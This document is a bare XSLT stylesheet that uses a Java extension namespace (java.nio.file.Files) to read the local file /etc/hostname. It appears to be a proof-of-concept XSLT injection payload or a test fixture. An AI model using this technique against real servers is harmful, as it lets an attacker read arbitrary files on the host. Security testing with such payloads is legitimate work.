<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                  xmlns:file="java:java.nio.file.Files">
  <xsl:template match="/">
    <xsl:value-of select="file:readAllLines('file:/etc/hostname')"/>
  </xsl:template>
</xsl:stylesheet>
